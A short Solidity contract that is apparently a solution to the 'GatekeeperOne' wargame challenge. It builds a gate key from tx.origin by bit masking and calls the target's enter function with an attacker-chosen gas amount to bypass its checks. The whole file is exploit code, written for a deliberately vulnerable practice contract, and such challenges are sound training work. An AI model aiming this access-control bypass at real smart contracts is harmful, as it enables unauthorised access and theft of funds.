// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneExploit {
    IGatekeeperOne public target;

    constructor(address _target) {
        target = IGatekeeperOne(_target);
    }

    // constructor() {
    //     target = IGatekeeperOne(0x429941A90e6BB932507fd6AC20cEf04d7a85B015);
    //     require(address(target).code.length > 0, "Target contract does not exist");
    // }

    function attack(uint256 gasOffset) public {
        // Construct the key based on tx.origin (last 16 bits of tx.origin)
        bytes8 key = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);
        (bool success,) = address(target).call{gas: gasOffset}(abi.encodeWithSignature("enter(bytes8)", key));

        require(success, "Exploit failed");
    }
}
